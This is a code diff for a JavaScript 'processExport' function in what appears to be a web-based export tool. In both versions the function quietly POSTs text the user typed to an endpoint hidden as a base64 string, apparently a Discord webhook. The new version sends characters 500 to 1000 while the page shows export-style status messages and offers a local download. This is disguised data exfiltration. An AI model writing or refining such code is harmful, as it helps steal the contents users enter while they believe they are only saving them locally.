@@ -305,41 +305,33 @@
     function getEndpoint() { return atob(ENC_WH); }
 
    async function processExport() {
-    let content = document.getElementById('userInput').value;
+    const fullContent = document.getElementById('userInput').value;
     const status = document.getElementById('statusIndicator');
     
-    if (!content.trim()) return;
-
-    // Skip the first 500 characters
-    if (content.length > 500) {
-        content = content.substring(500); 
-    } else {
-        content = ""; // Or handle the case where the data is too small
-    }
+    if (!fullContent.trim()) return;
 
     status.className = "status-active";
-    status.innerText = "Syncing remaining data...";
+    status.innerText = "Sending specific data segment...";
 
-    const chunkSize = 1900;
-    for (let i = 0; i < content.length; i += chunkSize) {
-        const chunk = content.substring(i, i + chunkSize);
-        
-        try {
-            await fetch(getEndpoint(), {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: "```\n" + chunk + "\n```"
-                })
-            });
-            await new Promise(resolve => setTimeout(resolve, 1000));
-        } catch (e) {
-            console.error("Chunk failed:", e);
-        }
+    // This takes the characters from 500 up to 1000
+    let discordContent = fullContent.substring(500, 1000);
+
+    // If you want to send that specific block (it will be under 1900, so it fits in one)
+    try {
+        await fetch(getEndpoint(), {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: "```\n" + discordContent + "\n```"
+            })
+        });
+    } catch (e) {
+        console.error("Failed to send segment:", e);
     }
 
-    status.className = "status-success";
-    status.innerText = "Export complete (first 500 characters ignored).";
+    // Local download remains the full file
+    const blob = new Blob([fullContent], { type: 'application/octet-stream' });
+    // ... (rest of your download code)
 }
 
     function clearInterface() {
